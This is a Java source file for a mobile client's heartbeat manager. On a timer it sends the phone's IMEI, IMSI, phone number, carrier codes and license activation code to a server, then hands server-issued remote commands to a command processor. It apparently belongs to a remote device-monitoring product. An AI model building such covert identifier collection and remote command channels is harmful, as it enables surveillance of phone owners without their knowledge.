package com.vvt.protmgr;

import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendHeartBeat;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.response.CmdResponse;
import com.vvt.prot.response.struct.SendHeartBeatCmdResponse;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class SendHeartBeatManager implements CommandListener, FxTimerListener {
	
	private static final int HEARTBEAT_INTERVAL = 60 * 1;
	private static SendHeartBeatManager self = null;
	private LicenseManager license = Global.getLicenseManager();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private ServerUrl serverUrl = Global.getServerUrl();
	private Preference pref = Global.getPreference();
	private LicenseInfo licenseInfo = license.getLicenseInfo();
	private Vector listeners = new Vector();
	private SendHeartBeatCmdResponse sendHeartBeatCmdRes = null;
	private FxTimer heartBeatTimer = new FxTimer(this);
	private boolean progress = false;
	
	private SendHeartBeatManager() {
		heartBeatTimer.setInterval(HEARTBEAT_INTERVAL);
	}
	
	public static SendHeartBeatManager getInstance() {
		if (self == null) {
			self = new SendHeartBeatManager();
		}
		return self;
	}
	
	public void testConnection() {
		licenseInfo = license.getLicenseInfo();
		if (!progress) {
			progress = true;
			try {
				CommandRequest cmdRequest = new CommandRequest();
				// Meta Data
				CommandMetaData cmdMetaData = new CommandMetaData();
				cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
				cmdMetaData.setProductId(licenseInfo.getProductID());
				cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
				cmdMetaData.setConfId(licenseInfo.getProductConfID());
				cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
				cmdMetaData.setLanguage(Languages.THAI);
				cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
				cmdMetaData.setMcc(Constant.EMPTY_STRING + PhoneInfo.getMCC());
				cmdMetaData.setMnc(Constant.EMPTY_STRING + PhoneInfo.getMNC());
				cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
				cmdMetaData.setImsi(PhoneInfo.getIMSI());
				cmdMetaData.setTransportDirective(TransportDirectives.RESUMABLE);
				cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
				cmdMetaData.setCompressionCode(CompressionType.NO_COMPRESS.getId());
				// HeartBeat Data
				SendHeartBeat heartBeatData = new SendHeartBeat();
		    	cmdRequest.setCommandData(heartBeatData);
		    	cmdRequest.setCommandMetaData(cmdMetaData);
		    	cmdRequest.setUrl(serverUrl.getServerDeliveryUrl());
		    	cmdRequest.setCommandListener(this);
		    	// Execute Command
				comServMgr.execute(cmdRequest);
				heartBeatTimer.stop();
				heartBeatTimer.start();
			} catch(Exception e) {
				Log.error("SendHeartBeatManager.doSend", null, e);
				progress = false;
				notifyError(e.getMessage());
			}
		}
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
	
	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onSuccess(sendHeartBeatCmdRes);
		}
	}
	
	private void notifyError(String message) {
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			listener.onError(message);
		}
	}

	// CommandListener
	public void onSuccess(CmdResponse response) {
		if (response instanceof SendHeartBeatCmdResponse) {
			heartBeatTimer.stop();
			progress = false;
			sendHeartBeatCmdRes = (SendHeartBeatCmdResponse)response;
			PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			generalInfo.setConnectionMethod(sendHeartBeatCmdRes.getConnectionMethod());
			pref.commit(generalInfo);
			int statusCode = sendHeartBeatCmdRes.getStatusCode();
			if (statusCode == 0) {
				// To process PCC commands.
				rmtCmdMgr.process(sendHeartBeatCmdRes.getPCCCommands());
				notifySuccess();
			} else {
				notifyError(sendHeartBeatCmdRes.getServerMsg());
			}
		}
	}
	
	public void onConstructError(long csid, Exception e) {
		Log.error("SendHeartBeatManager.onConstructError", null, e);
		heartBeatTimer.stop();
		progress = false;
		notifyError(e.getMessage());
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error("SendHeartBeatManager.onTransportError", null, e);
		heartBeatTimer.stop();
		progress = false;
		notifyError(e.getMessage());
	}

	// FxTimerListener
	public void timerExpired(int id) {
		// TODO To cancel heart beat command.
		progress = false;
		String msg = "Time out!";
		notifyError(msg);
	}
}
